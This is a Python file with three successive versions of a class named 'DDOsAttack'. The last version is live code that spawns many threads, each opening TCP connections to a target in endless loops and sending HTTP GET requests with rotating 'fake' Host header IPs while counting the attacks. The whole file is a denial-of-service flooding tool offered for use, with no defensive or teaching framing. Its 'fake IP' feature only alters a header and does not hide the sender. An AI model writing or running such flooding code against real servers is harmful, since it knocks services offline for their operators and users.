# import asyncio
# import socket
# import threading
# import atexit
#
#
# class DDOsAttack:
#     def __init__(self, target, fake_ip, port, nr_of_threads):
#         self.target = target
#         self.fake_ip = fake_ip
#         self.port = port
#         self.nr_of_threads = nr_of_threads
#         self.nr_of_attacks = 0
#         atexit.register(self.total_nr_attacks)
#
#     def attack(self):
#         while True:
#             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#             sock.connect((self.target, self.port))
#             sock.sendto(("GET /" + self.target + " HTTP/1.1\r\n").encode('ascii'), (self.target, self.port))
#             sock.sendto(("Host: " + self.fake_ip + "\r\n\r\n").encode('ascii'), (self.target, self.port))
#             self.nr_of_attacks += 1
#             if self.nr_of_attacks % 300 == 0:
#                 print(self.nr_of_attacks)
#             sock.close()
#
#     def attach_with_threads(self):
#         for t in range(self.nr_of_threads):
#             thread = threading.Thread(target=self.attack)
#             thread.start()
#
#     async def attack_async(self):
#         while True:
#             self.attack()
#             await asyncio.sleep(0) # Allow the other tasks to run
#
#     def attach_with_async(self, nr_of_threads):
#         loop = asyncio.get_event_loop()
#         tasks = [self.attack_async() for _ in range(nr_of_threads)]
#         loop.run_until_complete(asyncio.gather(*tasks))
#
#     def total_nr_attacks(self):
#         print(f"The total number of attacks was: {self.nr_of_attacks}")
#
# # Example usage:
# if __name__ == "__main__":
#     attack_instance = DDOsAttack(target="192.168.100.1", fake_ip="192.168.1.1", port=80, nr_of_threads=3)
#     attack_instance.attach_with_threads()
#     attack_instance.total_nr_attacks()



# import asyncio
# import socket
# import threading
# import atexit
#
# class DDOsAttack:
#     def __init__(self, target, fake_ip, port, nr_of_threads):
#         self.target = target
#         self.fake_ip = fake_ip
#         self.port = port
#         self.nr_of_threads = nr_of_threads
#         self.nr_of_attacks = 0
#         self.lock = threading.Lock()  # Add a lock for thread safety
#         atexit.register(self.total_nr_attacks)
#
#     def attack(self):
#         while True:
#             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#             sock.connect((self.target, self.port))
#             sock.sendto(("GET /" + self.target + " HTTP/1.1\r\n").encode('ascii'), (self.target, self.port))
#             sock.sendto(("Host: " + self.fake_ip + "\r\n\r\n").encode('ascii'), (self.target, self.port))
#             with self.lock:
#                 self.nr_of_attacks += 1
#                 if self.nr_of_attacks % 300 == 0:
#                     print(self.nr_of_attacks)
#             sock.close()
#
#     def attach_with_threads(self):
#         for _ in range(self.nr_of_threads):
#             thread = threading.Thread(target=self.attack)
#             thread.start()
#
#     async def attack_async(self):
#         while True:
#             self.attack()
#             await asyncio.sleep(0)  # Allow other tasks to run
#
#     def attach_with_async(self):
#         loop = asyncio.get_event_loop()
#         tasks = [self.attack_async() for _ in range(self.nr_of_threads)]
#         loop.run_until_complete(asyncio.gather(*tasks))
#
#     def total_nr_attacks(self):
#         print(f"The total number of attacks was: {self.nr_of_attacks}")
#
# # Example usage:
# if __name__ == "__main__":
#     attack_instance = DDOsAttack(target="192.168.100.1", fake_ip="192.168.1.1", port=80, nr_of_threads=900)
#     attack_instance.attach_with_threads()



import socket
import threading
import atexit

class DDOsAttack:
    def __init__(self, target, fake_ips, port, nr_of_threads):
        self.target = target
        self.fake_ips = fake_ips
        self.port = port
        self.nr_of_threads = nr_of_threads
        self.nr_of_attacks = 0
        self.current_fake_ip_index = 0
        self.lock = threading.Lock()
        atexit.register(self.total_nr_attacks)

    def attack(self):
        while True:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            fake_ip = self.get_current_fake_ip()
            sock.connect((self.target, self.port))
            sock.sendto(("GET /" + self.target + " HTTP/1.1\r\n").encode('ascii'), (self.target, self.port))
            sock.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (self.target, self.port))
            with self.lock:
                self.nr_of_attacks += 1
                if self.nr_of_attacks % 300 == 0:
                    print(self.nr_of_attacks)
            sock.close()

    def attach_with_threads(self):
        for _ in range(self.nr_of_threads):
            thread = threading.Thread(target=self.attack)
            thread.start()

    def get_current_fake_ip(self):
        with self.lock:
            fake_ip = self.fake_ips[self.current_fake_ip_index]
            self.current_fake_ip_index = (self.current_fake_ip_index + 1) % len(self.fake_ips)
        return fake_ip

    def total_nr_attacks(self):
        print(f"The total number of attacks was: {self.nr_of_attacks}")
#
# # Example usage:
# if __name__ == "__main__":
#     fake_ips = ["192.168.1.1", "192.168.1.2", "192.168.1.3"]  # Add more fake IPs as needed
#     attack_instance = DDOsAttack(target="192.168.100.1", fake_ips=fake_ips, port=80, nr_of_threads=100)
#     attack_instance.attach_with_threads()
